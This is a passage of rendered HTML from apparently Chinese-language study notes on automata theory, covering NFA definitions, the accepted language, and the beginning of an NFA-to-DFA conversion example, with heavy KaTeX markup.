class="mclose">)</span></span></span></span></p><p>我们发现NFA的式子和之前的FA的式子完全一致。这也非常好理解，因为NFA和DFA一样，都是FA。</p><p>只不过它的状态转移函数和DFA不同。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi><mo>:</mo><mi>Q</mi><mo>×</mo><mo>∑</mo><mo>→</mo><msup><mn>2</mn><mi>Q</mi></msup></mrow><annotation encoding="application/x-tex">\delta: Q\times\sum\rightarrow 2^Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">Q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Q</span></span></span></span></span></span></span></span></span></span></span>，对于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>Q</mi><mo>×</mo><mo>∑</mo><mo separator="true">,</mo><mtext> </mtext><mi>δ</mi><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><msub><mi>p</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>p</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>p</mi><mi>m</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\forall(q,a)\in Q\times\sum,\ \delta(q,a)=\{p_1,p_2,...p_m\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∀</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">Q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span>表示M在状态q读入字符a，可以选择地将状态变为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">p_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>或者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">p_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，…或者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">p_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，并将读头向右移动一个带方格而指向输入字符串的下一个字符。</p><p>FA的状态转移图、FA的状态对应的等价类、FA的即时描述对NFA都有效。</p><blockquote><p>很显然，不然就不叫&quot;FA&quot;的状态转移图了。</p><p>之前我们学的都是FA下的一些定义，只不过FA用的例子都是DFA的。</p></blockquote><p><img src="https://upyun.wuuconix.link/image-20211108132102816.png" alt="NFA的例子" /></p><p>我们可以从这个例子中看到，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>状态在接受到0这个输入字符串的时候，它会进行选择，可能转移到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>状态，也可能转移到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>状态。再看<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>状态，只有一个出度，也就是它只会去接受输入字符串中的&quot;0&quot;，而直接忽略掉&quot;1&quot;。</p><p>同样，如果一次性输入多个字符，就需要对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi></mrow><annotation encoding="application/x-tex">\delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span></span>进行扩充。</p><p><img src="https://upyun.wuuconix.link/image-20211108133325119.png" alt="NFA 扩充" /></p><p><img src="https://upyun.wuuconix.link/image-20211108133448820.png" alt="NFA 扩充" /></p><p><img src="https://upyun.wuuconix.link/image-20211108133828142.png" alt="NFA 扩充2" /></p><p>第一次对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi></mrow><annotation encoding="application/x-tex">\delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span></span>的扩充相当于能够让状态转移函数一次性能够接受多个输入字符，然后进行状态转移。</p><p>而第二次扩充相当于是让一开始的初始状态变成多个。相当于现在可以多个初始状态 同时接受到多个输入字符，然后进行状态转化。</p><h3 id="nfa-m接受识别的语言"><a class="markdownIt-Anchor" href="#nfa-m接受识别的语言"></a> NFA M接受（识别）的语言</h3><ol><li>对于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>∈</mo><msup><mo>∑</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\forall(x)\in\sum^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∀</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.078606em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.828596em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">)</mo><mo>∩</mo><mi>F</mi><mi mathvariant="normal">≠</mi><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\delta(q_0,x) \cap F\ne\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ϕ</span></span></span></span> 则称x被M接受，如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">)</mo><mo>∩</mo><mi>F</mi><mo>=</mo><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\delta(q_0,x) \cap F = \phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ϕ</span></span></span></span> 则称M不接受x。</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>M</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo>∈</mo><msup><mo>∑</mo><mo>∗</mo></msup><mi mathvariant="normal">且</mi><mi>δ</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">)</mo><mo>∩</mo><mi>F</mi><mi mathvariant="normal">≠</mi><mi>ϕ</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">L(M)=\{x|x\in \sum^* 且 \delta(q_0,x) \cap F \ne \phi \}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">x</span><span class="mord">∣</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.078606em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.828596em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">且</span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">ϕ</span><span class="mclose">}</span></span></span></span> 称为M接受（识别）的语言。</li></ol><h3 id="nfa和dfa等价"><a class="markdownIt-Anchor" href="#nfa和dfa等价"></a> NFA和DFA等价</h3><ol><li>对于一个输入字符，NFA可以进入若干个状态，而DFA智能进入一个唯一的状态</li><li>虽然从DFA看待的角度来说，NFA在某个时刻同时进入了若干个状态，但是，这若干个状态合起来的总效果相当于它处于这些状态对应的一个综合状态。因此我们考虑让DFA用一个状态来对应NFA的一组状态。</li></ol><p><img src="https://upyun.wuuconix.link/image-20211108135107339.png" alt="对应关系" /></p><h3 id="nfa转化为dfa的例子"><a class="markdownIt-Anchor" href="#nfa转化为dfa的例子"></a> NFA转化为DFA的例子</h3><p>上面讲了NFA与DFA的对应关系。这里给出一个实际转化的实例。</p><p><img src="https://upyun.wuuconix.link/image-20211108135904834.png" alt="例子" /></p><p><img src="https://upyun.wuuconix.link/image-20211108135916350.png" alt="状态转移函数" /></p><p>这里的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>是什么意思呢？在NFA看来<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是一个状态，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>也是一个状态，而对于NFA来说，在初始状态为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的情况下 ，接受输入字符为0，那么它既可以到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，也可以到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>但是DFA是不能实现这一点的，所以我们就把到达<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>或者到达<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation 